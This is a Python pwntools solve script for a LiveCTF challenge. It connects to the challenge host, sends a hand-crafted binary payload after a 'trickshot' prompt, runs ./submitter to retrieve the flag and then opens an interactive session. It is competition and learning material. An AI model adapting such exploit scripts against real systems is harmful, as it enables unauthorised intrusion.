#!/usr/bin/env python3
from pwn import *

# context.log_level = "DEBUG"

# p = process(["python3", "challenge.py"])
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))

payload = flat({
    0x0: b"LMAO",
    0x4: p16(0x1),
    0x6: p32(0x3355aa),
    0xa: b"\x04fUzZ\x00tHiS" + \
         b"\x11\x56\x56\x56\x56\x56\x56\x56\x01\x01" + \
         b"\x42\x02\x02\xFF\x33\x35\x35\x39\x39\x39" + \
         b"\x83" + b"\x02\x02\x02\x02" + b"\x04\x03\x03\x03" + b"\x03"
})

payload = payload.ljust(0x3e8, b"\x00")
assert len(payload) >= 0x3e8

p.sendafter(b"trickshot...\n", payload)
p.sendline(b"./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

p.interactive()